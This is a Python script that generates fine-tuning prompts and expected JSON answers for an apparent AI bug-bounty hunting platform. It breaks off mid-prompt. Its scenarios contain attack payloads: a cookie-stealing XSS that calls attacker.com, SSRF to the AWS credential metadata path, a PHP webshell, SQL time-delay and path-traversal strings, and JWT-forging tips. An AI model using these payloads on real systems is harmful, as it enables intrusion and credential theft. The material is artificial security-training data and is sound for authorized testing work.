#!/usr/bin/env python3
"""
Generate platform-specific training data for the Sentinel Primordial hunt engine.

Covers all 6 gaps identified in the fine-tuning audit:
  1. HunterEngine hypothesis JSON schema
  2. SolverPool endpoint task JSON schema
  3. VerifierAgent layer-4 confirmation JSON schema
  4. BackwardHunt attack tree JSON schema
  5. ReportGenerator summary/impact JSON schema
  6. Chat CMD sentinel format (Kali tool execution)
  + Bonus: confidence calibration, multi-iteration pivot, vulnClass taxonomy

Output: server/data/prompts/platform-schema-training.json
        (~400 entries, no API calls needed — all template-generated)

Run: python3 scripts/generate-platform-training.py
"""

import json
import random
import uuid
from pathlib import Path

random.seed(42)

ROOT = Path(__file__).parent.parent
OUT  = ROOT / "server" / "data" / "prompts" / "platform-schema-training.json"

# ── Realistic data pools ─────────────────────────────────────────────────────

TARGETS = [
    "https://app.example.com", "https://api.target.io/v2",
    "https://admin.corp.net", "https://shop.brand.com",
    "https://portal.saas.io", "https://dashboard.startup.co",
    "https://auth.platform.com", "https://api.fintech.io",
    "https://cms.enterprise.net", "https://staging.webapp.com",
]

ENDPOINTS = [
    "/api/users/{id}", "/search?q=", "/admin/login", "/upload",
    "/api/orders/{id}/items", "/profile/update", "/api/v1/products",
    "/reset-password", "/api/comments", "/export?format=csv",
    "/api/payments/{id}", "/admin/reports", "/api/auth/token",
    "/graphql", "/api/files/download?path=", "/webhook/callback",
]

TECH_STACKS = [
    "PHP/Laravel, MySQL, nginx 1.18", "Node.js/Express, MongoDB, nginx",
    "Python/Django, PostgreSQL, Apache", "Ruby on Rails, MySQL, Puma",
    "Java/Spring Boot, Oracle DB, Tomcat", "ASP.NET Core, MSSQL, IIS",
    "Next.js, PostgreSQL, Vercel", "Flask, Redis, gunicorn",
]

TOOLS = ["nmap", "nuclei", "ffuf", "sqlmap", "whatweb", "nikto", "curl_probe",
         "dalfox", "tplmap", "jwt_tool", "gobuster", "subfinder"]

VULN_CLASSES = [
    "xss", "sqli", "ssrf", "idor", "lfi", "rce", "auth_bypass",
    "info_disclosure", "misconfig", "open_redirect", "cors", "csrf",
    "xxe", "ssti", "http_smuggling", "security_headers",
]

SYSTEM_PROMPT = (
    "You are an expert security researcher and bug bounty hunter with deep knowledge of "
    "web application security, API security, network penetration testing, cloud infrastructure, "
    "and Kali Linux tooling. You analyze security scenarios, interpret tool output, reason about "
    "attack paths and vulnerability chains, and provide expert guidance on bug bounty tactics. "
    "Your responses are technically precise, concise, and reflect real-world bug bounty experience."
)

entries = []

def entry(prompt_id, category, scenario, visual_tags, prompt, reasoning_focus,
          expected_answer, evaluation_criteria):
    return {
        "id": str(uuid.uuid4()),
        "prompt_id": prompt_id,
        "category": category,
        "scenario": scenario,
        "visual_tags": visual_tags,
        "prompt": prompt,
        "reasoning_focus": reasoning_focus,
        "expected_answer": expected_answer,
        "evaluation_criteria": evaluation_criteria,
    }


# ════════════════════════════════════════════════════════════════════════════
# SECTION 1 — Hypothesis Generation JSON Schema
# ════════════════════════════════════════════════════════════════════════════

HYPOTHESIS_SCENARIOS = [
    {
        "obs_summary": "nmap scan reveals ports 80, 443, 8080, 3306 (MySQL exposed). whatweb: PHP/7.4, jQuery 1.8.3 (outdated). Headers: no X-Frame-Options, no CSP, Server: Apache/2.4.41.",
        "tags": ["mysql_exposed", "outdated_jquery", "missing_security_headers", "php"],
        "peak_anomaly": 0.78,
        "target": "https://shop.brand.com",
        "prev_hyps": 0,
        "expected_classes": [
            {"vulnClass": "sqli", "targetUrl": "https://shop.brand.com/search?q=", "reasoning": "MySQL port 3306 is externally accessible and PHP/7.4 with jQuery 1.8.3 suggests a legacy codebase with likely unparameterized queries in search/filter endpoints.", "confidence": 0.82, "priority": 9},
            {"vulnClass": "xss", "targetUrl": "https://shop.brand.com/search?q=", "reasoning": "Outdated jQuery 1.8.3 is vulnerable to CVE-2020-11022 (DOM XSS via .html()). No CSP header means any XSS payload executes without restriction.", "confidence": 0.76, "priority": 8},
            {"vulnClass": "misconfig", "targetUrl": "https://shop.brand.com", "reasoning": "MySQL on 3306 externally exposed is a critical misconfiguration. Combined with Apache version disclosure, information leakage is confirmed.", "confidence": 0.90, "priority": 10},
            {"vulnClass": "info_disclosure", "targetUrl": "https://shop.brand.com", "reasoning": "Server header discloses exact Apache version. Missing security headers (no X-Frame-Options, no CSP) indicate security hardening is absent.", "confidence": 0.85, "priority": 7},
        ],
    },
    {
        "obs_summary": "ffuf found /admin/login (200), /api/v1/users (200, returns JSON array of all users), /backup.zip (200, 2.1MB). nuclei: CVE-2021-44228 log4j detected on /api endpoint.",
        "tags": ["admin_panel", "idor_candidate", "backup_file", "log4j_rce"],
        "peak_anomaly": 0.95,
        "target": "https://api.target.io/v2",
        "prev_hyps": 0,
        "expected_classes": [
            {"vulnClass": "rce", "targetUrl": "https://api.target.io/v2/api", "reasoning": "Nuclei confirmed CVE-2021-44228 (Log4Shell) on the /api endpoint. This is a critical RCE via JNDI injection in log-processed user-controlled headers like X-Api-Version or User-Agent.", "confidence": 0.95, "priority": 10},
            {"vulnClass": "idor", "targetUrl": "https://api.target.io/v2/api/v1/users", "reasoning": "/api/v1/users returns a full JSON array of all users without apparent auth. Classic IDOR — enumerate by manipulating user IDs or accessing the listing endpoint directly.", "confidence": 0.88, "priority": 9},
            {"vulnClass": "info_disclosure", "targetUrl": "https://api.target.io/v2/backup.zip", "reasoning": "backup.zip (2.1MB) is publicly accessible. Likely contains source code, database dumps, or credentials. Must download and inspect.", "confidence": 0.92, "priority": 10},
            {"vulnClass": "auth_bypass", "targetUrl": "https://api.target.io/v2/admin/login", "reasoning": "Admin panel at /admin/login is exposed. With Log4j present suggesting Java stack, check for default credentials and auth bypass via parameter manipulation.", "confidence": 0.60, "priority": 7},
        ],
    },
    {
        "obs_summary": "Target is a REST API (Next.js frontend, Node.js backend). Observations: CORS wildcard (*) on all /api routes. /api/user returns {id, email, role} including 'role: admin' for test account. JWT token uses HS256 with weak secret (cracked by hashcat in 2s: 'secret123').",
        "tags": ["cors_wildcard", "jwt_weak_secret", "role_exposure", "nodejs"],
        "peak_anomaly": 0.88,
        "target": "https://auth.platform.com",
        "prev_hyps": 2,
        "expected_classes": [
            {"vulnClass": "auth_bypass", "targetUrl": "https://auth.platform.com/api/user", "reasoning": "JWT HS256 with cracked secret 'secret123' allows forging tokens with arbitrary claims. Can set role:admin and escalate to full admin access. Already have 2 hypotheses tested — focusing on direct exploitation path.", "confidence": 0.97, "priority": 10},
            {"vulnClass": "cors", "targetUrl": "https://auth.platform.com/api", "reasoning": "CORS wildcard (*) on all /api routes combined with the weak JWT means a malicious page can make authenticated requests on behalf of any victim who visits it.", "confidence": 0.85, "priority": 8},
            {"vulnClass": "idor", "targetUrl": "https://auth.platform.com/api/user", "reasoning": "Response includes numeric 'id' field. With admin token (forged), enumerate /api/user/{id} to access all user records. Role field in response confirms privilege levels.", "confidence": 0.80, "priority": 8},
        ],
    },
    {
        "obs_summary": "E-commerce site (PHP/WooCommerce, WordPress 5.8). Observations: /wp-admin accessible (200), xmlrpc.php enabled, /wp-content/uploads/ directory listing open. Several plugins: contact-form-7 v5.2 (known stored XSS), woocommerce-pdf-invoices v2.9.1.",
        "tags": ["wordpress", "xmlrpc_enabled", "directory_listing", "outdated_plugin"],
        "peak_anomaly": 0.72,
        "target": "https://shop.brand.com",
        "prev_hyps": 1,
        "expected_classes": [
            {"vulnClass": "xss", "targetUrl": "https://shop.brand.com/wp-admin/admin-ajax.php", "reasoning": "contact-form-7 v5.2 has a known stored XSS (CVE-2020-35489). Payloads in form fields persist in DB and execute for admin users visiting submissions. High value for account takeover.", "confidence": 0.83, "priority": 9},
            {"vulnClass": "info_disclosure", "targetUrl": "https://shop.brand.com/wp-content/uploads/", "reasoning": "Directory listing enabled on uploads/ exposes all uploaded files including invoices, customer data, and potentially backup files. Already tested 1 hypothesis — this is a fresh attack surface.", "confidence": 0.90, "priority": 8},
            {"vulnClass": "auth_bypass", "targetUrl": "https://shop.brand.com/xmlrpc.php", "reasoning": "xmlrpc.php enabled allows credential brute-forcing via system.multicall without rate limiting. Combined with /wp-admin exposure, this is a primary auth bypass vector.", "confidence": 0.70, "priority": 8},
            {"vulnClass": "rce", "targetUrl": "https://shop.brand.com/wp-admin", "reasoning": "If /wp-admin credentials obtained, WordPress file editor allows PHP execution. woocommerce-pdf-invoices v2.9.1 may have file inclusion vulnerabilities.", "confidence": 0.55, "priority": 7},
        ],
    },
    {
        "obs_summary": "SaaS dashboard (React SPA, Python/FastAPI backend). ffuf: /api/v1/admin/users (403), /api/v1/export (200, triggers CSV download), /api/v1/webhooks (200). Observation: export endpoint accepts 'format' parameter, returns file. Visual tags: [XHR:POST:/api/v1/export:200:blob], [COOKIE:session:HttpOnly].",
        "tags": ["api_endpoint", "file_export", "webhook", "react_spa", "fastapi"],
        "peak_anomaly": 0.65,
        "target": "https://portal.saas.io",
        "prev_hyps": 3,
        "expected_classes": [
            {"vulnClass": "ssrf", "targetUrl": "https://portal.saas.io/api/v1/webhooks", "reasoning": "Webhook endpoint likely accepts user-supplied URLs. FastAPI backend will make outbound HTTP requests to attacker-controlled URLs, enabling SSRF to cloud metadata (169.254.169.254) and internal services.", "confidence": 0.72, "priority": 9},
            {"vulnClass": "lfi", "targetUrl": "https://portal.saas.io/api/v1/export", "reasoning": "Export endpoint with 'format' parameter and blob response. Test path traversal: format=../../../../etc/passwd. Python backends are susceptible to open() with unvalidated user paths.", "confidence": 0.65, "priority": 8},
            {"vulnClass": "idor", "targetUrl": "https://portal.saas.io/api/v1/admin/users", "reasoning": "/api/v1/admin/users returns 403 for current role. With 3 prior hypotheses tested, pivoting to horizontal privilege escalation — manipulate user ID in JWT sub claim to access other tenants' data.", "confidence": 0.60, "priority": 7},
        ],
    },
    {
        "obs_summary": "Financial services API. Observations: GraphQL endpoint at /graphql with introspection enabled. Schema reveals mutations: transferFunds, updateAccountDetails, deleteUser. No CSRF token in any mutation. Response headers: X-Request-Id present (sequential integers).",
        "tags": ["graphql", "introspection_enabled", "csrf_candidate", "sequential_ids"],
        "peak_anomaly": 0.80,
        "target": "https://api.fintech.io",
        "prev_hyps": 0,
        "expected_classes": [
            {"vulnClass": "csrf", "targetUrl": "https://api.fintech.io/graphql", "reasoning": "GraphQL mutations (transferFunds, updateAccountDetails) accept no CSRF token. If session cookie is not SameSite=Strict, an attacker page can POST arbitrary mutations on behalf of authenticated users — critical for fund transfer.", "confidence": 0.88, "priority": 10},
            {"vulnClass": "idor", "targetUrl": "https://api.fintech.io/graphql", "reasoning": "Sequential X-Request-Id integers suggest sequential user/account IDs in the schema. Use introspection to enumerate ID-based queries: query { account(id: X) { balance, transactions } }.", "confidence": 0.82, "priority": 9},
            {"vulnClass": "info_disclosure", "targetUrl": "https://api.fintech.io/graphql", "reasoning": "GraphQL introspection enabled in production exposes full schema including internal types, mutations, and field names. This is a reconnaissance goldmine that reveals the entire attack surface.", "confidence": 0.95, "priority": 8},
            {"vulnClass": "auth_bypass", "targetUrl": "https://api.fintech.io/graphql", "reasoning": "Check if deleteUser and transferFunds mutations enforce authorization server-side or rely solely on client-side role checks. Test with low-privilege token against high-privilege mutations.", "confidence": 0.65, "priority": 8},
        ],
    },
]

for i, sc in enumerate(HYPOTHESIS_SCENARIOS):
    pid = f"PS-H{i+1:03d}"
    prev_note = f"\nPreviously tested hypotheses: {sc['prev_hyps']}" if sc['prev_hyps'] > 0 else ""
    prompt_text = f"""You are an expert security researcher performing bug bounty hunting. Think step by step before generating hypotheses.

Step 1 — Interpret the observations: what do the signals imply about the stack, authentication model, and likely attack surface?
Step 2 — Identify prerequisite conditions: which vulnerability classes have their preconditions already satisfied by what you've observed?
Step 3 — Estimate what confirming evidence would look like for each candidate class.
Step 4 — Output your hypotheses as JSON.

Target: {sc['target']}
Recent observations (anomaly-sorted):
{sc['obs_summary']}
Peak anomaly score: {sc['peak_anomaly']}
Signal tags: {', '.join(sc['tags'])}

Current confirmed findings: 0{prev_note}

[Available tool capabilities by vuln class]
  xss: dalfox, nuclei, curl_probe
  sqli: sqlmap, nuclei, curl_probe
  ssrf: curl_probe, nuclei
  rce: nuclei, tplmap, curl_probe
  idor: curl_probe, ffuf
  auth_bypass: curl_probe, jwt_tool, nuclei

Generate 3-5 specific vulnerability hypotheses based on the observations.
Each hypothesis must have:
- vulnClass: (xss/sqli/ssrf/idor/lfi/rce/auth_bypass/info_disclosure/misconfig/open_redirect/cors/csrf/xxe/ssti)
- targetUrl: specific URL or endpoint to test
- reasoning: why you believe this vulnerability exists
- confidence: 0.0-1.0 based on evidence strength
- priority: 1-10 (10=highest)

Return ONLY valid JSON array of hypothesis objects."""

    entries.append(entry(
        pid, "platform_hypothesis_generation",
        f"Hunt engine hypothesize() call — {sc['target']} with peak anomaly {sc['peak_anomaly']}",
        "",
        prompt_text,
        "Produce valid JSON hypothesis array with correct field names, realistic confidence scores calibrated to evidence strength, and vulnClass strings matching platform taxonomy exactly.",
        json.dumps(sc['expected_classes'], indent=2),
        "JSON parses without error; vulnClass values are in platform taxonomy; confidence scores reflect evidence quality (high anomaly = higher confidence); reasoning is specific to observed signals not generic.",
    ))


# ════════════════════════════════════════════════════════════════════════════
# SECTION 2 — SolverPool Endpoint Task JSON
# ════════════════════════════════════════════════════════════════════════════

SOLVER_SCENARIOS = [
    {
        "endpoint": "https://shop.brand.com/api/products/search?q=shoes&category=1",
        "obs": "PHP backend, MySQL database, parameter 'q' and 'category' reflected in response. Response time varies 200ms-4000ms on numeric inputs.",
        "expected": [
            {"vulnClass": "sqli", "priority": 10, "confidence": 0.88, "reasoning": "Numeric 'category' parameter with variable response times (200ms vs 4000ms) is a strong time-based blind SQLi signal. PHP/MySQL stack confirms the attack surface."},
            {"vulnClass": "xss", "priority": 8, "confidence": 0.72, "reasoning": "'q' parameter is reflected in search results page. Test with <script>alert(1)</script> and angular/vue template injection payloads."},
            {"vulnClass": "open_redirect", "priority": 5, "confidence": 0.35, "reasoning": "Search endpoints sometimes include a 'next' or 'redirect' parameter for post-search navigation. Worth checking parameter enumeration."},
        ],
    },
    {
        "endpoint": "https://api.target.io/v2/api/v1/users/profile",
        "obs": "REST endpoint, JWT auth via Bearer token. Response includes {id: 1337, email, role, created_at}. GET returns current user, PUT accepts updates.",
        "expected": [
            {"vulnClass": "idor", "priority": 10, "confidence": 0.85, "reasoning": "Numeric user ID 1337 in response. Test /api/v1/users/{id}/profile with sequential IDs using another user's token. Also test /api/v1/users/0, /api/v1/users/1 (admin IDs)."},
            {"vulnClass": "auth_bypass", "priority": 9, "confidence": 0.75, "reasoning": "PUT /profile accepts updates. Test mass assignment: include 'role': 'admin' in PUT body. Many ORMs apply all provided fields without allowlist."},
            {"vulnClass": "info_disclosure", "priority": 7, "confidence": 0.80, "reasoning": "Response reveals internal user ID, role, and creation timestamp. Test unauthenticated access and check if admin users' profiles are accessible cross-tenant."},
        ],
    },
    {
        "endpoint": "https://portal.saas.io/api/v1/webhooks/create",
        "obs": "POST endpoint accepting JSON body with {url, events[], secret}. Server makes outbound HTTP request to url when events trigger. No URL validation visible.",
        "expected": [
            {"vulnClass": "ssrf", "priority": 10, "confidence": 0.92, "reasoning": "Webhook URL parameter with no visible validation. Server makes outbound requests to arbitrary URLs. Target AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/. Test also for internal service discovery via 10.0.0.0/8 range."},
            {"vulnClass": "csrf", "priority": 7, "confidence": 0.55, "reasoning": "If webhook creation lacks CSRF protection, attacker can create webhooks pointing to attacker-controlled servers to capture internal request data."},
        ],
    },
    {
        "endpoint": "https://cms.enterprise.net/admin/file-upload",
        "obs": "Multipart form upload, accepts images. Server stores files in /var/www/uploads/. Content-Type validated client-side only (JS check). nginx serves /uploads/ directory.",
        "expected": [
            {"vulnClass": "rce", "priority": 10, "confidence": 0.80, "reasoning": "Client-side only Content-Type validation. Upload a PHP webshell with .php extension or bypass with double extension (.jpg.php). nginx serving /uploads/ directly means uploaded PHP files will execute if Apache/PHP processes them."},
            {"vulnClass": "lfi", "priority": 7, "confidence": 0.60, "reasoning": "If filename is user-controlled and reflected in a file inclusion context, path traversal in filename (../../../etc/passwd) may work."},
            {"vulnClass": "info_disclosure", "priority": 6, "confidence": 0.65, "reasoning": "Check if /uploads/ has directory listing. Other users' uploaded files may be accessible. Look for PDF invoices, CSV exports, backup files."},
        ],
    },
    {
        "endpoint": "https://app.example.com/reset-password?token=abc123&email=user@test.com",
        "obs": "GET request with token and email in URL. Token appears to be 8 hex chars. Response: 'Password reset link sent'. No rate limiting observed on 50 rapid requests.",
        "expected": [
            {"vulnClass": "auth_bypass", "priority": 10, "confidence": 0.85, "reasoning": "8-char hex token = 16^8 = 4B combinations but with no rate limiting, brute force is viable. Also test: token=0000000, token=admin, email parameter manipulation to redirect reset to attacker email."},
            {"vulnClass": "info_disclosure", "priority": 8, "confidence": 0.78, "reasoning": "Token in URL leaks to server logs, Referer headers, and browser history. If reset link is emailed, token is also exposed in email headers to mail servers."},
            {"vulnClass": "open_redirect", "priority": 6, "confidence": 0.50, "reasoning": "Some reset flows include a 'next' redirect parameter. Test: reset-password?token=x&next=https://evil.com to redirect post-reset."},
        ],
    },
]

for i, sc in enumerate(SOLVER_SCENARIOS):
    pid = f"PS-S{i+1:03d}"
    prompt_text = f"""You are a bug bounty strategy coordinator analyzing an endpoint.

Endpoint: {sc['endpoint']}
Observations: {sc['obs']}

[Available tool capabilities by vuln class]
  xss: dalfox, nuclei, curl_probe
  sqli: sqlmap, nuclei, curl_probe
  ssrf: curl_probe, nuclei
  rce: nuclei, tplmap, curl_probe
  idor: curl_probe, ffuf
  auth_bypass: curl_probe, jwt_tool, nuclei
  lfi: curl_probe, ffuf
  open_redirect: curl_probe
  csrf: curl_probe

Determine which vulnerability classes to test. Consider:
- What technologies are present?
- What parameters does the endpoint accept?
- What is the likely attack surface?
- Historical success rates

Return a JSON array of objects with:
- vulnClass: the vulnerability class to test
- priority: 1-10 (10=highest)
- confidence: 0.0-1.0 (likelihood of finding)
- reasoning: why this vuln class applies

Only include vuln classes with confidence > 0.3. Maximum 5 tasks.
Return ONLY the JSON array."""

    entries.append(entry(
        pid, "platform_solver_task_planning",
        f"SolverPool endpoint analysis — {sc['endpoint']}",
        "",
        prompt_text,
        "Plan endpoint-specific vulnerability tests, output valid JSON array with platform vulnClass taxonomy, realistic confidence based on observed signals.",
        json.dumps(sc['expected'], indent=2),
        "Valid JSON array; vulnClass in platform taxonomy; confidence > 0.3 filter respected; reasoning references specific observed signals; maximum 5 tasks.",
    ))


# ════════════════════════════════════════════════════════════════════════════
# SECTION 3 — VerifierAgent Layer-4 Confirmation JSON
# ════════════════════════════════════════════════════════════════════════════

VERIFIER_SCENARIOS = [
    {
        "endpoint": "https://shop.brand.com/search?q=<script>alert(document.cookie)</script>",
        "vuln": "xss", "payload": "<script>alert(document.cookie)</script>",
        "orig_conf": 0.72,
        "layer2": {"confirmed": True, "statusCode": 200, "responseSnippet": "...results for <script>alert(document.cookie)</script>..."},
        "layer3": {"confirmed": True, "consoleAlerts": ["dialog:alert:s3ss10n=abc123"]},
        "vision": "Browser shows alert dialog with text 's3ss10n=abc123' indicating JavaScript executed and accessed document.cookie. Page URL shows unencoded payload in query string.",
        "expected": {"confirmed": True, "reasoning": "XSS confirmed across all verification layers. HTTP reprobe (L2) shows payload reflected unencoded in response body. Browser replay (L3) triggered an alert dialog containing actual session cookie value. Vision analysis confirms the dialog. This is a high-confidence stored/reflected XSS with cookie theft capability.", "confidenceAdjustment": 0.25},
    },
    {
        "endpoint": "https://api.target.io/v2/api/v1/users/1337",
        "vuln": "idor", "payload": "GET /api/v1/users/1 (admin user ID)",
        "orig_conf": 0.65,
        "layer2": {"confirmed": False, "statusCode": 403, "responseSnippet": "{\"error\": \"Forbidden\"}"},
        "layer3": {"confirmed": False, "consoleAlerts": []},
        "vision": "Browser shows 403 Forbidden response. No user data accessible.",
        "expected": {"confirmed": False, "reasoning": "IDOR hypothesis not confirmed. L2 HTTP reprobe returned 403 Forbidden for /api/v1/users/1, indicating server-side authorization is enforced. L3 browser replay also returned 403. No evidence of cross-user data access. Authorization controls appear to be working correctly for this endpoint.", "confidenceAdjustment": -0.45},
    },
    {
        "endpoint": "https://portal.saas.io/api/v1/webhooks/create",
        "vuln": "ssrf", "payload": "{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
        "orig_conf": 0.80,
        "layer2": {"confirmed": True, "statusCode": 200, "responseSnippet": "{\"status\": \"webhook registered\", \"last_response\": {\"AccessKeyId\": \"ASIA...\", \"SecretAccessKey\": \"wJal...\"}}"},
        "layer3": {"confirmed": True, "consoleAlerts": []},
        "vision": "API response contains AWS IAM credentials (AccessKeyId, SecretAccessKey, SessionToken) retrieved from the EC2 metadata endpoint. Critical finding confirmed.",
        "expected": {"confirmed": True, "reasoning": "SSRF confirmed as critical severity. The webhook endpoint made a successful outbound request to the AWS metadata service (169.254.169.254) and returned live IAM credentials in the webhook response body. The AccessKeyId prefix 'ASIA' indicates temporary STS credentials. This allows full AWS account compromise. Confidence significantly elevated.", "confidenceAdjustment": 0.18},
    },
    {
        "endpoint": "https://shop.brand.com/api/products?category=1 AND SLEEP(5)--",
        "vuln": "sqli", "payload": "1 AND SLEEP(5)--",
        "orig_conf": 0.75,
        "layer2": {"confirmed": True, "statusCode": 200, "responseSnippet": "[...product list...]", "responseTime": 5234},
        "layer3": {"confirmed": False, "consoleAlerts": []},
        "vision": "Normal product listing page displayed. No visible error or anomaly.",
        "expected": {"confirmed": True, "reasoning": "Time-based blind SQLi confirmed via L2 HTTP reprobe. The SLEEP(5) payload caused a 5.2 second response time (vs baseline ~200ms), confirming the SQL injection is executing server-side. L3 browser replay shows normal page (expected for blind SQLi — no visible error). The time delay is definitive evidence of injectable parameter. Recommend escalating to UNION-based extraction or using sqlmap --technique=T.", "confidenceAdjustment": 0.20},
    },
    {
        "endpoint": "https://app.example.com/redirect?next=https://evil.com",
        "vuln": "open_redirect", "payload": "https://evil.com",
        "orig_conf": 0.55,
        "layer2": {"confirmed": True, "statusCode": 302, "responseSnippet": "Location: https://evil.com"},
        "layer3": {"confirmed": True, "consoleAlerts": []},
        "vision": "Browser navigated to https://evil.com successfully. Address bar shows evil.com. Open redirect confirmed — user is fully redirected away from application.",
        "expected": {"confirmed": True, "reasoning": "Open redirect confirmed. L2 shows 302 Location header pointing directly to attacker-controlled domain. L3 browser replay confirms the redirect executes and lands on evil.com. In a bug bounty context this enables phishing attacks: craft a legitimate-looking URL (app.example.com/redirect?next=...) that redirects to a credential harvesting page. Impact: medium (P3) — no direct data access but enables social engineering at scale.", "confidenceAdjustment": 0.10},
    },
    {
        "endpoint": "https://cms.enterprise.net/admin/file-upload",
        "vuln": "rce", "payload": "shell.php (content: <?php system($_GET['cmd']); ?>)",
        "orig_conf": 0.70,
        "layer2": {"confirmed": False, "statusCode": 200, "responseSnippet": "{\"status\": \"uploaded\", \"path\": \"/uploads/shell.jpg\"}"},
        "layer3": {"confirmed": False, "consoleAlerts": []},
        "vision": "Upload succeeded but file stored as .jpg extension. Attempted access to /uploads/shell.jpg?cmd=id returned the PHP source code as text, not execution output.",
        "expected": {"confirmed": False, "reasoning": "RCE via file upload not confirmed in current form. The server renamed the file to .jpg extension (preventing PHP execution) and the uploads directory serves files with Content-Type: text/plain rather than executing them. However, the upload succeeded — test alternative bypasses: double extension (shell.php.jpg → check if Apache MultiViews processes it), .phtml extension, null byte injection (shell.php%00.jpg), or Content-Type mismatch. Partial success warrants continued testing.", "confidenceAdjustment": -0.15},
    },
]

for i, sc in enumerate(VERIFIER_SCENARIOS):
    pid = f"PS-V{i+1:03d}"
    vision_section = f"\nVision Model Analysis:\n{sc['vision']}" if sc.get('vision') else ""
    prompt_text = f"""You are a senior security researcher reviewing a potential vulnerability finding.

Endpoint: {sc['endpoint']}
Vulnerability Class: {sc['vuln']}
Payload Used: {sc['payload']}
Original Confidence: {sc['orig_conf']}

Layer 2 (HTTP Reprobe):
- Confirmed: {sc['layer2']['confirmed']}
- Status Code: {sc['layer2']['statusCode']}
- Response: {sc['layer2']['responseSnippet']}

Layer 3 (Browser Replay):
- Confirmed: {sc['layer3']['confirmed']}
- Console/Dialog alerts: {json.dumps(sc['layer3']['consoleAlerts'])}
{vision_section}
Based on ALL the evidence above, determine:
1. Is this a genuine vulnerability (not a false positive)?
2. What is the confidence adjustment (-0.5 to +0.3)?
3. Brief reasoning.

Return JSON: {{ "confirmed": boolean, "reasoning": string, "confidenceAdjustment": number }}"""

    entries.append(entry(
        pid, "platform_verifier_confirmation",
        f"VerifierAgent layer-4 AI confirmation — {sc['vuln']} at {sc['endpoint'][:50]}",
        "",
        prompt_text,
        "Synthesize multi-layer evidence into a confirmed/rejected decision with precise confidence adjustment and clear reasoning.",
        json.dumps(sc['expected'], indent=2),
        "JSON with exactly 3 fields: confirmed (bool), reasoning (string >50 chars), confidenceAdjustment (-0.5 to +0.3); reasoning references specific layer evidence; adjustment magnitude reflects evidence quality.",
    ))


# ════════════════════════════════════════════════════════════════════════════
# SECTION 4 — ReportGenerator Summary/Impact JSON
# ════════════════════════════════════════════════════════════════════════════

REPORT_SCENARIOS = [
    {
        "vuln": "Reflected Cross-Site Scripting (XSS)", "endpoint": "https://shop.brand.com/search?q=",
        "program": "BrandCo Bug Bounty", "payload": "<img src=x onerror=document.location='https://attacker.com/steal?c='+document.cookie>",
        "verification": {"confirmed": True, "finalConfidence": 0.91, "layer3_playwright": {"consoleAlerts": ["cookie stolen: session=abc123xyz"], "domChanged": True}},
        "expected": {
            "summary": "A reflected cross-site scripting vulnerability was identified in the product search endpoint at /search?q=, allowing arbitrary JavaScript execution in the context of any user who clicks a crafted link. The payload was confirmed to successfully exfiltrate session cookies to an attacker-controlled server.",
            "impact": "Exploitation allows an attacker to steal authenticated session tokens, perform actions on behalf of victims without their knowledge, and potentially achieve full account takeover at scale. Given the search endpoint's prominence in the application, a malicious link could be distributed via phishing or social media to target large numbers of BrandCo customers, leading to mass credential theft and fraudulent transactions."
        },
    },
    {
        "vuln": "Server-Side Request Forgery (SSRF)", "endpoint": "https://portal.saas.io/api/v1/webhooks",
        "program": "SaaS Platform VDP", "payload": "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "verification": {"confirmed": True, "finalConfidence": 0.97, "layer3_playwright": {"consoleAlerts": [], "responseData": "AccessKeyId: ASIA..., SecretAccessKey: wJal..."}},
        "expected": {
            "summary": "A critical server-side request forgery vulnerability was confirmed in the webhook registration endpoint, enabling an attacker to make the server issue arbitrary HTTP requests including to the AWS EC2 instance metadata service, successfully retrieving live IAM credentials with 97% confidence.",
            "impact": "Successful exploitation grants an attacker access to AWS IAM credentials associated with the application's EC2 instance role, which may include permissions to access S3 buckets containing customer data, invoke Lambda functions, query databases via RDS, or pivot to other AWS services. This constitutes a complete cloud infrastructure compromise that could expose all customer data hosted on the platform and enable persistent access via credential exfiltration."
        },
    },
    {
        "vuln": "SQL Injection (Time-Based Blind)", "endpoint": "https://shop.brand.com/api/products?category=",
        "program": "BrandCo Bug Bounty", "payload": "1 AND SLEEP(5)--",
        "verification": {"confirmed": True, "finalConfidence": 0.89, "layer3_playwright": {"consoleAlerts": [], "responseTime": 5234}},
        "expected": {
            "summary": "A time-based blind SQL injection vulnerability was confirmed in the product category filter parameter, with a SLEEP(5) payload producing a consistent 5.2-second response delay, confirming unsanitized SQL execution against the backend MySQL database.",
            "impact": "Exploitation of this SQL injection enables an attacker to extract the complete contents of the MySQL database including customer PII, payment information (if stored), password hashes, and internal application data. With sufficient access, the attacker may be able to write files to disk (via SELECT INTO OUTFILE) or achieve remote code execution if the MySQL user has FILE privileges. All BrandCo customer records are at risk of exfiltration."
        },
    },
    {
        "vuln": "Insecure Direct Object Reference (IDOR)", "endpoint": "https://api.target.io/v2/api/v1/orders/",
        "program": "Target.io Bounty Program", "payload": "GET /api/v1/orders/1001 (using auth token for account #2847)",
        "verification": {"confirmed": True, "finalConfidence": 0.93, "layer3_playwright": {"consoleAlerts": [], "responseData": "order data for user_id: 1001 returned to user 2847"}},
        "expected": {
            "summary": "An insecure direct object reference vulnerability was confirmed in the order retrieval endpoint, allowing any authenticated user to access order details belonging to other customers by modifying the numeric order ID in the request path.",
            "impact": "Any authenticated Target.io user can enumerate and read all customer orders across the platform by iterating through sequential order IDs. Order records contain customer names, delivery addresses, purchased items, payment method last-four digits, and fulfillment status — constituting a significant privacy breach affecting all historical orders. With sufficient enumeration, this enables targeted phishing using real customer purchase data and potential identity theft."
        },
    },
    {
        "vuln": "Remote Code Execution via SSTI", "endpoint": "https://app.example.com/profile/name",
        "program": "ExampleApp Bug Bounty", "payload": "{{7*7}} → response shows 49",
        "verification": {"confirmed": True, "finalConfidence": 0.95, "layer3_playwright": {"consoleAlerts": [], "responseData": "Hello 49, your profile has been updated"}},
        "expected": {
            "summary": "A server-side template injection vulnerability was confirmed in the profile name field, with the mathematical expression {{7*7}} being evaluated server-side and returning 49, indicating the Jinja2/Twig template engine is processing user-controlled input without sanitization.",
            "impact": "Server-side template injection in Python/Jinja2 enables full remote code execution on the application server. An attacker can use payload chains to execute arbitrary OS commands, read sensitive files (private keys, environment variables, database credentials), establish reverse shells, and pivot to internal network resources. This represents complete compromise of the application server and all data it can access."
        },
    },
]

for i, sc in enumerate(REPORT_SCENARIOS):
    pid = f"PS-R{i+1:03d}"
    prompt_text = f"""Write a professional bug bounty report section for:
Vulnerability: {sc['vuln']}
Endpoint: {sc['endpoint']}
Program: {sc['program']}
Verification: {json.dumps(sc['verification'], indent=2)}
Payload: {sc['payload']}

Generate:
1. "summary": A 2-3 sentence executive summary for the security team (professional, factual)
